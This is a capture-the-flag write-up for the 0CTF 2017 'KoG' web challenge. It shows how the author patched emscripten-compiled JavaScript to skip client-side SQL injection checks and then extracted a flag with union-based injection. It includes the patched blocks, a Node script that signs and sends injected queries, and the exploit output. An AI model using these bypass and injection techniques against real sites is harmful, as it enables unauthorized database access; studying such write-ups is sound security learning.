+++
title = "0CTF 2017 - KoG"
date = "2017-03-19T21:11:57-07:00"
tags = ["CTF", "Web", "SQLi"]
+++

Do you know you can run your C++ program in browser?

<!--more-->

# Problem

> King of Glory is a funny game. Our website has a list of players.  
> http://202.120.7.213:11181

# Solution

Hitting the given URL doesn't show anything interesting, but the page source code indicating it was looking for `id`
parameter.  So try it with `?id=1`, we can see it made a request to api.php with some interesting parameters.

```
http://202.120.7.213:11181/api.php?id=1&hash=035c6d4adf335c31e884796a11a2590f&time=1489983725
```

Ha, looks like it hashes `id` using current time as salt and use that hash to validate at server side for integrity.
If you try to put some SQLi stuff in `id`, it will reject hash generation, which happens in client side.
So the goal is pretty straightforward: bypass client side SQLi detection, generate hash and inject the server!

Now it comes the hard part: the [hash generation code][1] is the most complex Javascript code I have ever seen.  Tracing
into `Module.main`, I see memory allocators, function maps, and even function name that suggests system calls.
What The Heck!

Googling around I figured it out: it was compiled from C/C++, using [emscripten][2].

> Emscripten is an LLVM-based project that compiles C and C++ into highly-optimizable JavaScript in asm.js format.
> This lets you run C and C++ on the web at near-native speed, without plugins.

The bad news, there is little, if not none, tools to reverse engineer generated Javascript code.

The good news, it is still plain text, far better than ELF binary. It is easy to inject tracing code, run it with and
without SQLi characters and compare the call sequence to find out where to apply patches.

The function in question was `__Z10user_inputNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE`. After
commenting out following two if blocks, it generates hash for any input.

```javascript
if (!($13)) {
 ;HEAP32[$agg$result>>2]=HEAP32[$s>>2]|0;HEAP32[$agg$result+4>>2]=HEAP32[$s+4>>2]|0;HEAP32[$agg$result+8>>2]=HEAP32[$s+8>>2]|0;
 ;HEAP32[$s>>2]=0|0;HEAP32[$s+4>>2]=0|0;HEAP32[$s+8>>2]=0|0;
 __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
 __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
 STACKTOP = sp;return;
}
```

```javascript
if ((label|0) == 12) {
 ;HEAP32[$agg$result>>2]=HEAP32[$s>>2]|0;HEAP32[$agg$result+4>>2]=HEAP32[$s+4>>2]|0;HEAP32[$agg$result+8>>2]=HEAP32[$s+8>>2]|0;
 ;HEAP32[$s>>2]=0|0;HEAP32[$s+4>>2]=0|0;HEAP32[$s+8>>2]=0|0;
 __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
 __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
 STACKTOP = sp;return;
}
```

Now it becomes a simple SQLi task.  First use `order by` trick to find out number of columns in the `select` statement.
Then query `information_schema.tables` and `information_schema.columns` to find table and column in question.

It is handy to write a simple `main.js` that does the hash and curl so no need to copy-paste around.

```javascript
var Module = require('./functionn.js');

var q = process.argv[2];
var hash = Module.main(q).split('|');

var req = 'http://202.120.7.213:11181/api.php?id=' + encodeURI(q) + '&hash=' + hash[0] + '&time=' + hash[1]
console.log(req);

var spawn = require('child_process').spawn;
var curl = spawn('curl', [req]);

curl.stdout.on('data', (data) => {
  console.log(`response: ${data}`);
});
```

```
$ node main.js "1 union all select 1,hey from fl4g"
http://202.120.7.213:11181/api.php?id=1%20union%20all%20select%201,hey%20from%20fl4g&hash=c2f05acaf2f91ba81b8c9b3ce2304da7&time=1489882992
response: EaseSingle Qinflag{emScripten_is_Cut3_right?}
```

[1]: /0ctf-2017/functionn.js
[2]: http://kripken.github.io/emscripten-site
